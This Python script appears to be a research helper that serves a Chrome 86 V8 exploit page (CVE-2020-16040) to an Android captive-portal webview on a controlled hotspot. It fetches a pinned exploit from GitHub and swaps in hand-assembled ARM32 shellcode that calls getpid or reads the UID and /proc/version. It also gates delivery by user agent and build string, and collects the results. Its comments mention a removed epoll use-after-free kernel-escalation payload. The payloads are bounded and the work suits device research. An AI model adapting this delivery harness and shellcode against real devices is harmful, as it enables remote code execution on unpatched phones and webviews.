#!/usr/bin/env python3
"""Serve one tightly gated PurrTol-derived renderer proof profile.

The source page is pinned to one public GitHub commit. Before serving, this
helper verifies the exact Git blob and rewrites its 254-word in-memory payload
to one selected bounded ARM32 profile plus ARM NOPs. It serves the page once,
and only to the expected Android CaptivePortalLogin request. Other requests
get a plain captive-portal hint or an empty response; the device is never sent
the original epoll-race payload.

The default profile calls only getpid. The optional env profile, gated on a
prior getpid result, records UID and reads at most 255 bytes of /proc/version.
Neither profile provides root, ADB, persistence, or storage access. The page
still uses the published CVE-2020-16040 V8 trigger. When started with sudo to
bind port 80, it drops to the invoking user before fetching the pinned source
or serving requests.
"""

import argparse
import hashlib
import http.server
import ipaddress
import json
import re
import socketserver
import threading
import urllib.parse
import urllib.request

from portal_probe_runtime import drop_privileges_after_bind


SOURCE_URL = (
    "https://raw.githubusercontent.com/amemefarmer/the-purrtol/"
    "9c9022dbf75f68311ac945bc9a0bd722d2536032/"
    "portal-freedom/captive-portal/www/exploit/rce_chrome86.html"
)
SOURCE_GIT_BLOB_SHA1 = "9dd1150f69bfdd23640b11d22601484a0aee1afc"
MAX_SOURCE_BYTES = 512 * 1024
MAX_REPORT_BYTES = 4096
EXPECTED_ASSIGNMENTS = 254
NOP_WORD = 0xE1A00000  # ARM32: mov r0, r0
PURRTOL_ROUTE_PATHS = {"/mobile/status.php", "/generate_204", "/gen_204"}

# Assembled from research/purrtol_stage1_getpid.S (ARMv7-A, little-endian).
# It calls only getpid, stores the PID in wasm_mem+0x140c, returns 0xCC01,
# and restores the caller's callee-saved registers.
GETPID_WORDS = (
    0xE92D4FF0,  # push {r4-r11, lr}
    0xE3A07014,  # mov r7, #20 (__NR_getpid)
    0xEF000000,  # svc #0
    0xE24F4014,  # sub r4, pc, #20 -> wasm_mem base
    0xE2845A01,  # add r5, r4, #0x1000
    0xE2855B01,  # add r5, r5, #0x400
    0xE285500C,  # add r5, r5, #12 -> wasm_mem+0x140c
    0xE5850000,  # str r0, [r5]
    0xE30C0C01,  # movw r0, #0xCC01
    0xE8BD8FF0,  # pop {r4-r11, pc}
)

# Assembled from research/purrtol_stage1_envprobe.S (ARMv7-A, little-endian).
# It records only getuid32/getpid and reads at most 255 bytes from
# /proc/version into the existing WebAssembly mapping. Result slots reuse the
# retained page's decoder: version length at +0x1408, PID at +0x140c, UID at
# +0x141c, read error at +0x1420, and version bytes at +0x3000.
ENV_PROBE_WORDS = (
    0xE92D4FF0, 0xE24DD010, 0xE1A0A004, 0xE28ABB05, 0xE3A070C7, 0xEF000000,
    0xE58B001C, 0xE3A07014, 0xEF000000, 0xE58B000C, 0xE3A00000, 0xE58B0008,
    0xE58B0020, 0xE28A0B01, 0xE59F108C, 0xE5801000, 0xE59F1088, 0xE5801004,
    0xE59F1084, 0xE5801008, 0xE3A0106E, 0xE580100C, 0xE28A0B01, 0xE3A01000,
    0xE3A07005, 0xEF000000, 0xE3500000, 0xBA000012, 0xE1A08000, 0xE1A00008,
    0xE28A1A03, 0xE3A020FF, 0xE3A07003, 0xEF000000, 0xE3500000, 0xDA000005,
    0xE58B0008, 0xE28A1A03, 0xE0811000, 0xE3A02000, 0xE5C12000, 0xEA000000,
    0xE58B0020, 0xE1A00008, 0xE3A07006, 0xEF000000, 0xEA000000, 0xE58B0020,
    0xE30C0C01, 0xE28DD010, 0xE8BD8FF0, 0x6F72702F, 0x65762F63, 0x6F697372,
)

WORD_ASSIGNMENT = re.compile(
    r"(?P<lhs>\bw\[\s*(?P<index>\d+)\s*\]\s*=\s*)"
    r"0x[0-9a-fA-F]{8}"
)
PID_RESULT = re.compile(r"PID_FROM_RENDER=(\d+)")
RESULT_MARKER = re.compile(r"pid_probe=0x([0-9a-fA-F]{8})")
ENV_RESULT = re.compile(
    r"ENV_RESULT pid=(\d+) uid=(\d+) version_bytes=(\d+) "
    r"version=(.*?) read_status=(0x[0-9a-fA-F]{8})"
)
ENV_MARKER = re.compile(r"env_probe=0x([0-9a-fA-F]{8})")

CAPTIVE_HINT = b"""<!doctype html><meta charset=utf-8>
<title>Portal network check</title>
<p>Local Portal network check. Use the Portal's sign-in prompt to continue.</p>
"""
MISMATCH_PAGE = b"""<!doctype html><meta charset=utf-8>
<title>Portal renderer check</title>
<p>No renderer payload was served. See the local Terminal for the request details.</p>
"""


def build_renderer_page(profile):
    if profile not in {"getpid", "env"}:
        raise ValueError("unsupported renderer proof profile")

    request = urllib.request.Request(
        SOURCE_URL,
        headers={"User-Agent": f"PortalStage1{profile.title()}/1.0"},
    )
    with urllib.request.urlopen(request, timeout=20) as response:
        source = response.read(MAX_SOURCE_BYTES + 1)
    if not source or len(source) > MAX_SOURCE_BYTES:
        raise RuntimeError("Pinned source is empty or too large")

    blob_header = b"blob " + str(len(source)).encode("ascii") + b"\0"
    digest = hashlib.sha1(blob_header + source).hexdigest()
    if digest != SOURCE_GIT_BLOB_SHA1:
        raise RuntimeError("Pinned PurrTol source hash did not match; refusing to serve")

    html = source.decode("utf-8")
    matches = list(WORD_ASSIGNMENT.finditer(html))
    indexes = [int(match.group("index")) for match in matches]
    if len(matches) != EXPECTED_ASSIGNMENTS or indexes != list(range(EXPECTED_ASSIGNMENTS)):
        raise RuntimeError("Unexpected shellcode layout; refusing to serve")

    payload_words = GETPID_WORDS if profile == "getpid" else ENV_PROBE_WORDS
    if len(payload_words) > EXPECTED_ASSIGNMENTS:
        raise RuntimeError("Selected renderer payload exceeds the pinned word table")

    def replace_word(match):
        index = int(match.group("index"))
        word = payload_words[index] if index < len(payload_words) else NOP_WORD
        return match.group("lhs") + f"0x{word:08x}"

    html = WORD_ASSIGNMENT.sub(replace_word, html)

    if profile == "env":
        old_result = """                desc = 'RACE_DONE iters='+r_iters+' sent='+r_sent+' recv='+r_recv+' uid='+r_uid+' phase='+r_phase;"""
        new_result = """                var version_bytes = Math.max(0, Math.min(r_inner | 0, 255));
                var version_data = new Uint8Array(wasm_instance.exports.memory.buffer, 0x3000, version_bytes);
                var kernel_version = new TextDecoder().decode(version_data).replace(/[\\r\\n\\t]+/g, ' ').trim();
                desc = 'ENV_RESULT pid='+r_iters+' uid='+r_uid+' version_bytes='+version_bytes+' version='+kernel_version+' read_status='+hex32(r_status);"""
        if old_result not in html:
            raise RuntimeError("Pinned PurrTol result decoder changed; refusing env profile")
        html = html.replace(old_result, new_result, 1)

    # Keep every executable statement and the exploit function's structure in
    # the pinned exploit. These substitutions rename its retained interface
    # and decoder output to match the selected bounded post-RCE proof.
    profile_name = "pid_probe" if profile == "getpid" else "env_probe"
    html = html.replace("epoll_uaf", profile_name)
    if profile == "getpid":
        html = html.replace("RACE_DONE iters=", "PID_FROM_RENDER=")
        title = "Portal Renderer PID Proof"
        heading = "Renderer getpid proof"
        payload_description = "bounded getpid payload and harmless ARM NOP fill"
    else:
        title = "Portal Renderer Environment Probe"
        heading = "Renderer UID and kernel-version probe"
        payload_description = "bounded PID, UID, and /proc/version probe"
    html = html.replace("<title>Portal Setup</title>", f"<title>{title}</title>")
    html = html.replace("<h2>Portal Configuration</h2>", f"<h2>{heading}</h2>")

    # Remove stale descriptive comments only. They are not part of executable
    # JavaScript and would otherwise claim an epoll payload was being sent.
    html = html.replace(
        f"""    /*
     * {profile_name} v1: CVE-2021-1048 epoll UAF race test.
     * Tests the race condition (close vs epoll_ctl) + sendmsg spray.
     * Does NOT yet implement kernel escalation (v1 = race diagnostics only).
     * Returns 0xCCxx (CC00=root, CC01=race done no root, CC10=setup fail, CC20=clone fail).
     * Results at wasm_mem+0x1400: phase, epfd_outer, epfd_inner, iterations,
     *   spray_sent, spray_recv, child_pid, uid_after, final_status.
     * Source: payloads/{profile_name}.s (260 words, 1040 bytes)
     */""",
        f"""    /* One-shot renderer proof: {payload_description}.
     * The generated memory contains no epoll race or privilege-escalation payload.
     */""",
    )
    html = html.replace(
        f"""    /* Pre-fill WASM memory with {profile_name} v1.1 shellcode (254 words, 1016 bytes).
     * CVE-2021-1048 epoll UAF race test + sendmsg iov spray.
     * v1.1 fix: spray via iov data (128B) instead of msg_control (compat cmsghdr rejected).
     * Source: payloads/{profile_name}.s */""",
        f"""    /* Preserve the pinned page's 254 assignments while loading only the
     * {payload_description}. */""",
    )
    return html.encode("utf-8")


def target_request_reason(handler):
    path = urllib.parse.urlsplit(handler.path).path
    if path not in PURRTOL_ROUTE_PATHS:
        return "path_mismatch"
    if handler.headers.get("X-Requested-With", "") != "com.android.captiveportallogin":
        return "x_requested_with_mismatch"

    ua = handler.headers.get("User-Agent", "")
    if "Android 9" not in ua or "Chrome/86.0.4240.198" not in ua:
        return "browser_mismatch"
    if "Build/PKQ1.191202.001" not in ua:
        return "build_mismatch"
    if "Portal" not in ua or "; wv)" not in ua:
        return "webview_mismatch"
    return "match"


def record_page_report(server, stage, status, detail):
    if stage == "s4" and status == "RESULT":
        if server.profile == "env":
            marker = ENV_MARKER.search(detail)
            result = ENV_RESULT.search(detail)
            if marker and int(marker.group(1), 16) == 0xCC01 and result:
                pid, uid, version_bytes = (int(result.group(i)) for i in (1, 2, 3))
                version = " ".join(
                    "".join(ch if ch.isprintable() else " " for ch in result.group(4)).split()
                )
                read_status = result.group(5).lower()
                if (
                    pid > 0
                    and 0 < version_bytes <= 255
                    and read_status == "0x00000000"
                    and version
                    and len(version) <= 255
                ):
                    with server.report_lock:
                        if not server.success_reported:
                            print(
                                "renderer_environment=complete "
                                f"pid={pid} uid={uid} version_bytes={version_bytes} "
                                f"read_status={read_status} kernel={version!r}",
                                flush=True,
                            )
                            server.success_reported = True
                    return
            with server.report_lock:
                if not server.result_reported:
                    print("renderer_environment=not_confirmed", flush=True)
                    server.result_reported = True
            return

        marker = RESULT_MARKER.search(detail)
        pid_match = PID_RESULT.search(detail)
        if marker and int(marker.group(1), 16) == 0xCC01 and pid_match:
            pid = int(pid_match.group(1))
            if pid > 0:
                with server.report_lock:
                    if not server.success_reported:
                        print(f"renderer_getpid=success pid={pid}", flush=True)
                        server.success_reported = True
                return
        with server.report_lock:
            if not server.result_reported:
                print("renderer_getpid=not_confirmed", flush=True)
                server.result_reported = True
        return

    if stage or status:
        print(
            f"renderer_stage stage={str(stage)[:32]!r} status={str(status)[:32]!r}",
            flush=True,
        )


class Stage1Handler(http.server.BaseHTTPRequestHandler):
    server_version = "PortalPurrTolStage1/1.1"
    sys_version = ""

    def log_message(self, _format, *_args):
        return

    def send_bytes(self, status, content_type, body):
        self.send_response(status)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.send_header("X-Content-Type-Options", "nosniff")
        self.send_header("Referrer-Policy", "no-referrer")
        if content_type.startswith("text/html"):
            self.send_header(
                "Content-Security-Policy",
                # Chrome 86 gates WebAssembly compilation on unsafe-eval.
                "default-src 'none'; script-src 'unsafe-inline' 'unsafe-eval'; "
                "style-src 'unsafe-inline'; img-src 'self'; connect-src 'self'; "
                "base-uri 'none'; form-action 'none'",
            )
        self.end_headers()
        if body:
            self.wfile.write(body)

    def is_page_client(self):
        return (
            self.server.page_served
            and self.client_address[0] == self.server.page_client_ip
            and self.headers.get("User-Agent", "") == self.server.page_user_agent
        )

    def do_GET(self):
        path = urllib.parse.urlsplit(self.path).path
        if path == "/api/report":
            if not self.is_page_client():
                self.send_bytes(404, "text/plain; charset=utf-8", b"")
                return
            query = urllib.parse.parse_qs(urllib.parse.urlsplit(self.path).query)
            stage = query.get("stage", [""])[0]
            status = query.get("status", [""])[0]
            detail = query.get("detail", [""])[0]
            record_page_report(self.server, stage, status, detail)
            self.send_bytes(204, "text/plain; charset=utf-8", b"")
            return

        if path not in PURRTOL_ROUTE_PATHS:
            print(
                "http_request "
                f"path={path[:160]!r} "
                f"host={self.headers.get('Host', '<missing>')[:100]!r} "
                f"x_requested_with={self.headers.get('X-Requested-With', '<missing>')[:100]!r} "
                f"user_agent={self.headers.get('User-Agent', '<missing>')[:220]!r}",
                flush=True,
            )

        if path in PURRTOL_ROUTE_PATHS:
            reason = target_request_reason(self)
            with self.server.serve_lock:
                already_served = self.server.page_served
                if reason == "match" and not already_served:
                    self.server.page_served = True
                    self.server.page_client_ip = self.client_address[0]
                    self.server.page_user_agent = self.headers.get("User-Agent", "")
                    serve_page = True
                else:
                    serve_page = False

            if serve_page:
                print(
                    "renderer_page_served_once "
                    f"host={self.headers.get('Host', '<missing>')[:100]!r} "
                    f"x_requested_with={self.headers.get('X-Requested-With', '<missing>')[:100]!r} "
                    f"user_agent={self.headers.get('User-Agent', '<missing>')[:220]!r}",
                    flush=True,
                )
                self.send_bytes(200, "text/html; charset=utf-8", self.server.page)
            elif already_served:
                print("renderer_page_blocked reason=one_shot_already_used", flush=True)
                self.send_bytes(204, "text/plain; charset=utf-8", b"")
            else:
                print(
                    f"renderer_page_blocked reason={reason} "
                    f"host={self.headers.get('Host', '<missing>')[:100]!r} "
                    f"x_requested_with={self.headers.get('X-Requested-With', '<missing>')[:100]!r} "
                    f"user_agent={self.headers.get('User-Agent', '<missing>')[:220]!r}",
                    flush=True,
                )
                self.send_bytes(200, "text/html; charset=utf-8", MISMATCH_PAGE)
            return

        # A non-204 connectivity response prompts Android to open its captive
        # login activity. This is a static hint and contains no exploit code.
        self.send_bytes(200, "text/html; charset=utf-8", CAPTIVE_HINT)

    def do_POST(self):
        if (
            urllib.parse.urlsplit(self.path).path != "/api/report"
            or not self.is_page_client()
        ):
            self.send_bytes(404, "text/plain; charset=utf-8", b"")
            return
        try:
            length = int(self.headers.get("Content-Length", "-1"))
        except ValueError:
            length = -1
        if not 0 < length <= MAX_REPORT_BYTES:
            self.send_bytes(413, "text/plain; charset=utf-8", b"")
            return
        try:
            payload = json.loads(self.rfile.read(length))
            if not isinstance(payload, dict):
                raise ValueError("not an object")
            stage = payload.get("stage", "")
            status = payload.get("status", "")
            detail = payload.get("detail", "")
            if not all(isinstance(value, str) for value in (stage, status, detail)):
                raise ValueError("invalid fields")
        except (UnicodeDecodeError, json.JSONDecodeError, ValueError):
            self.send_bytes(400, "text/plain; charset=utf-8", b"")
            return

        record_page_report(self.server, stage, status, detail)
        self.send_bytes(204, "text/plain; charset=utf-8", b"")

    def do_HEAD(self):
        self.send_bytes(204, "text/plain; charset=utf-8", b"")

    def do_PUT(self):
        self.send_bytes(405, "text/plain; charset=utf-8", b"")

    def do_DELETE(self):
        self.send_bytes(405, "text/plain; charset=utf-8", b"")


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "--bind",
        required=True,
        help="IPv4 address of the controlled hotspot interface",
    )
    parser.add_argument("--port", type=int, default=80)
    parser.add_argument(
        "--profile",
        choices=("getpid", "env"),
        default="getpid",
        help="getpid proof (default) or bounded UID and /proc/version report",
    )
    parser.add_argument(
        "--confirm-prior-getpid",
        action="store_true",
        help="confirm the one-shot getpid proof already succeeded before env profile",
    )
    args = parser.parse_args()
    if args.profile == "env" and not args.confirm_prior_getpid:
        parser.error("profile env requires --confirm-prior-getpid")

    try:
        bind_ip = ipaddress.IPv4Address(args.bind)
    except ipaddress.AddressValueError:
        parser.error("--bind must be an IPv4 address assigned to the hotspot interface")
    if bind_ip.is_unspecified:
        parser.error("bind to the hotspot's specific IPv4 address, not all interfaces")
    if not 1 <= args.port <= 65535:
        parser.error("--port must be between 1 and 65535")

    class ReusableTCPServer(socketserver.ThreadingTCPServer):
        allow_reuse_address = True
        daemon_threads = True

    with ReusableTCPServer((args.bind, args.port), Stage1Handler) as server:
        drop_privileges_after_bind()
        try:
            page = build_renderer_page(args.profile)
        except Exception as exc:
            parser.error(f"could not prepare the pinned one-shot page: {exc}")
        server.page = page
        server.profile = args.profile
        server.page_served = False
        server.page_client_ip = None
        server.page_user_agent = None
        server.serve_lock = threading.Lock()
        server.report_lock = threading.Lock()
        server.success_reported = False
        server.result_reported = False
        print(
            f"Pinned PurrTol page verified for profile={args.profile}; "
            f"transformed 254 payload words. Listening on http://{args.bind}:{args.port}/; "
            "the CVE page can be served once, only to a matching Chrome 86 "
            "CaptivePortalLogin request on an observed PurrTol route. Ctrl-C stops the helper.",
            flush=True,
        )
        try:
            server.serve_forever()
        except KeyboardInterrupt:
            print("Stopped.", flush=True)


if __name__ == "__main__":
    main()
